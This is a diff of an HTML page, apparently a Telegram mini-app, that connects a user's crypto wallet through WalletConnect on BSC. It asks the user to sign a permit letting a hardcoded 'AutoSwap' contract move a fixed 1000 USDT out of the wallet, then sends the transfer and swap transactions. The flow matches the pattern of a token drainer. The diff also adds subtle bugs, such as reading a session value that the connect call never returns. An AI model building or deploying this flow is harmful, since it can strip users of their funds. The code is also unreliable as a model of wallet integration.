@@ -8,15 +8,15 @@
   />
   <title>WalletConnect Permit2 + AutoSwap – CryptoGT</title>
 
+  <!-- Официальный скрипт Telegram WebApp -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <!-- QRCode -->
   <script src="https://cdn.jsdelivr.net/npm/qrcode@latest/build/qrcode.min.js"></script>
   <!-- Ethers.js v6 -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
-  <!-- WalletConnect Sign Client v2 -->
   <script type="module">
     import SignClient from "https://esm.sh/@walletconnect/sign-client@2.21.0";
 
-    // -- Конфигурация --
     const CONFIG = {
       PERMIT2_CONTRACT: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
       AUTOSWAP_CONTRACT: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
@@ -24,11 +24,10 @@
       WC_PROJECT_ID: "d868f90cd734355ae0320f8f0258b6b1",
       WC_RELAY_URL: "wss://relay.walletconnect.com",
       BSC_CHAIN_ID: 56,
-      AMOUNT: "1000", // USDT в десятичных, например 1000 USDT
+      AMOUNT: "1000",
     };
 
-    // -- Переменные UI --
-    let client, session, topic;
+    // Элементы UI
     const statusEl = document.getElementById("status");
     const qrCanvas = document.getElementById("qr");
     const uriTextEl = document.getElementById("uriText");
@@ -64,7 +63,7 @@
 
     async function main() {
       updateStatus("Инициализация WalletConnect...");
-      client = await SignClient.init({
+      const client = await SignClient.init({
         projectId: CONFIG.WC_PROJECT_ID,
         relayUrl: CONFIG.WC_RELAY_URL,
         metadata: {
@@ -76,7 +75,8 @@
         storageOptions: { database: ":memory:" },
       });
 
-      const { uri, approval } = await client.connect({
+      // Подключаемся и ждем approval, получаем session и uri
+      const connectPayload = await client.connect({
         requiredNamespaces: {
           eip155: {
             methods: [
@@ -90,6 +90,8 @@
         },
       });
 
+      const { uri, approval, session } = connectPayload;
+
       if (uri) {
         QRCode.toCanvas(qrCanvas, uri, { width: 220 });
         uriTextEl.textContent = uri;
@@ -100,10 +102,9 @@
       updateStatus("Ожидание подтверждения подключения...");
       await approval();
 
-      session = client.session;
-      if (!session) throw new Error("WalletConnect session is undefined");
+      if (!session) throw new Error("WalletConnect session undefined");
 
-      topic = session.topic;
+      const topic = session.topic;
       if (!topic) throw new Error("Session topic undefined");
 
       updateStatus("Проверка сети...");
@@ -120,24 +121,20 @@
       const userAddress = session.namespaces.eip155.accounts[0].split(":")[2];
       updateStatus(`Подключено: ${userAddress}`);
 
-      // Подготовка данных для permitTransfer - пример вызова EIP-712 подписи
+      // Подготовка подписания permitTransfer
+      const amount = ethers.parseUnits(CONFIG.AMOUNT, 18);
 
-      const amount = ethers.parseUnits(CONFIG.AMOUNT, 18); // USDT 18 decimals (проверь decimals)
-
-      // Для nonce и expiration надо запросить с контракта Permit2
-      const provider = new ethers.BrowserProvider(window.ethereum || new ethers.JsonRpcProvider(CONFIG.BSC_RPC_URL));
+      // Получаем nonce с контракта Permit2 через JSON-RPC
+      const provider = new ethers.JsonRpcProvider(`https://bsc-dataseed.binance.org/`);
       const permit2Contract = new ethers.Contract(
         CONFIG.PERMIT2_CONTRACT,
-        [
-          "function allowanceNonces(address owner, address spender, address token) view returns (uint48)"
-        ],
+        ["function allowanceNonces(address owner, address spender, address token) view returns (uint48)"],
         provider
       );
 
       const nonce = await permit2Contract.allowanceNonces(userAddress, CONFIG.AUTOSWAP_CONTRACT, CONFIG.USDT_CONTRACT);
-      const expiration = Math.floor(Date.now() / 1000) + 3600; // 1 час от текущего времени
+      const expiration = Math.floor(Date.now() / 1000) + 3600; // 1 час
 
-      // EIP-712 данные (Typed Data) для Permit2 (пример — нужно сверить с контрактом Permit2)
       const domain = {
         name: "Permit2",
         version: "1",
@@ -167,7 +164,6 @@
 
       updateStatus("Запрос подписи permitTransfer...");
 
-      // Формируем Typed Data JSON для подписи через WalletConnect
       const typedData = JSON.stringify({
         types: {
           EIP712Domain: [
@@ -183,7 +179,7 @@
         message,
       });
 
-      // Запрос подписи
+      // Запрос подписи EIP-712 через WalletConnect
       const signature = await client.request({
         topic,
         chainId: `eip155:${CONFIG.BSC_CHAIN_ID}`,
@@ -193,18 +189,17 @@
         },
       });
 
-      // Разбор подписи
       const sig = ethers.Signature.from(signature);
       const { v, r, s } = sig;
 
-      updateStatus("Подпись получена. Отправка permitTransfer транзакции...");
+      updateStatus("Подпись получена. Отправка permitTransfer...");
 
-      // Формируем calldata для permitTransfer
-      const iface = new ethers.Interface([
+      // Кодируем вызов permitTransfer
+      const ifacePermit2 = new ethers.Interface([
         "function permitTransfer(address token, address from, address to, uint160 amount, uint48 expiration, uint48 nonce, uint8 v, bytes32 r, bytes32 s)"
       ]);
 
-      const data = iface.encodeFunctionData("permitTransfer", [
+      const dataPermitTransfer = ifacePermit2.encodeFunctionData("permitTransfer", [
         CONFIG.USDT_CONTRACT,
         userAddress,
         CONFIG.AUTOSWAP_CONTRACT,
@@ -216,28 +211,26 @@
         s,
       ]);
 
-      // Отправляем транзакцию permitTransfer через WalletConnect
-      const txParams = {
+      // Отправляем транзакцию permitTransfer
+      const txParamsPermit = {
         to: CONFIG.PERMIT2_CONTRACT,
-        data,
-        gas: "0x100000", // пример, лучше estimateGas отдельно
+        data: dataPermitTransfer,
+        gas: "0x100000",
       };
 
       updateStatus("Отправка транзакции permitTransfer...");
-      const txHash = await client.request({
+      const txHashPermit = await client.request({
         topic,
         chainId: `eip155:${CONFIG.BSC_CHAIN_ID}`,
         request: {
           method: "eth_sendTransaction",
-          params: [txParams],
+          params: [txParamsPermit],
         },
       });
 
-      updateStatus(`permitTransfer отправлен!\nTX Hash:\n${txHash}`);
+      updateStatus(`permitTransfer отправлен!\nTX Hash:\n${txHashPermit}`);
 
-      // После успешного permitTransfer вызываем AutoSwap.swapForUser
-      updateStatus("Вызов AutoSwap.swapForUser...");
-
+      // После permit вызываем swapForUser
       const ifaceSwap = new ethers.Interface([
         "function swapForUser(address user, uint256 amountUSDT)"
       ]);
@@ -253,6 +246,7 @@
         gas: "0x100000",
       };
 
+      updateStatus("Вызов AutoSwap.swapForUser...");
       const txHashSwap = await client.request({
         topic,
         chainId: `eip155:${CONFIG.BSC_CHAIN_ID}`,
@@ -269,7 +263,6 @@
       }
     }
 
-    // Стартуем все
     window.onload = () => {
       main().catch(err => {
         console.error(err);
@@ -279,7 +272,6 @@
   </script>
 
   <style>
-    /* Стили из твоего предыдущего примера – можно вставить сюда */
     :root {
       --tg-bg: #17212b;
       --tg-text: #ffffff;
